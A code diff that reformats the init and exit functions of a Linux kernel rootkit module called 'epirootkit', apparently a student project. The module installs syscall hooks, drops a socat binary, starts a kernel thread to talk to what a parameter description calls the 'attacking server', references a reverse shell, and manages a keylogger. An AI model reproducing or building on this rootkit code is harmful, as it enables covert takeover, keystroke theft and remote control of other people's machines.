@@ -1,7 +1,7 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/kernel.h>
 #include <linux/kthread.h>
+#include <linux/module.h>
 #include <linux/uaccess.h>
 
 #include "epirootkit.h"
@@ -28,72 +28,70 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
  * @return Returns 0 (SUCCESS) on successful initialization, or a negative
  * error code if the kernel thread fails to start.
  */
-static int __init epirootkit_init(void){
-	DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
-	
-	// Initalize hooks for the syscall table
-	int err;
-	err = fh_install_hooks(hooks, hook_array_size);
-	if (err)
-	{
-		printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
-		return err;
-	}
+static int __init epirootkit_init(void) {
+    DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
 
-	// Init structure for exec_code_stds
-	if(init_exec_result() != SUCCESS) {
-		ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
-		return -ENOMEM;
-	}
+    // Initalize hooks for the syscall table
+    int err;
+    err = fh_install_hooks(hooks, hook_array_size);
+    if (err) {
+        printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
+        return err;
+    }
 
-	if(drop_socat_binaire() != SUCCESS) {
-		ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
-		return -FAILURE;
-	}
+    // Init structure for exec_code_stds
+    if (init_exec_result() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
+        return -ENOMEM;
+    }
 
-	// launch_reverse_shell();
+    if (drop_socat_binaire() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
+        return -FAILURE;
+    }
 
-	// Start a kernel thread that will handle network communication
-	thread_exited = false;
-	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
-	if (IS_ERR(network_thread)) {
-		ERR_MSG("epirootkit: epirootkit_init: failed to start thread\n");
-		thread_exited = true;
-		return PTR_ERR(network_thread);
-	}
+    // launch_reverse_shell();
 
-	return SUCCESS;
+    // Start a kernel thread that will handle network communication
+    thread_exited = false;
+    network_thread = kthread_run(network_worker, NULL, "netcom_thread");
+    if (IS_ERR(network_thread)) {
+        ERR_MSG("epirootkit: epirootkit_init: failed to start thread\n");
+        thread_exited = true;
+        return PTR_ERR(network_thread);
+    }
+
+    return SUCCESS;
 }
 
 /**
  * @brief Cleanup function called when the module is unloaded.
  *
- * This function is executed during the module's exit phase. 
+ * This function is executed during the module's exit phase.
  */
-static void __exit epirootkit_exit(void){
-	remove_socat_binaire();
+static void __exit epirootkit_exit(void) {
+    remove_socat_binaire();
 
-	// stop keylogger
-	epikeylog_exit();
+    // stop keylogger
+    epikeylog_exit();
 
-	free_exec_result();
+    free_exec_result();
 
-	if (network_thread) {
-		if (!thread_exited)
-			kthread_stop(network_thread);
-		thread_exited = true;
-		network_thread = NULL;
-		DBG_MSG("epirootkit: close_thread: thread stopped\n");
-	}
+    if (network_thread) {
+        if (!thread_exited)
+            kthread_stop(network_thread);
+        thread_exited = true;
+        network_thread = NULL;
+        DBG_MSG("epirootkit: close_thread: thread stopped\n");
+    }
 
-	close_socket();
+    close_socket();
 
-	// Remove hooks from the syscall table
-	fh_remove_hooks(hooks, hook_array_size);
+    // Remove hooks from the syscall table
+    fh_remove_hooks(hooks, hook_array_size);
 
-	DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
+    DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
 }
-
 
 module_init(epirootkit_init);
 module_exit(epirootkit_exit);
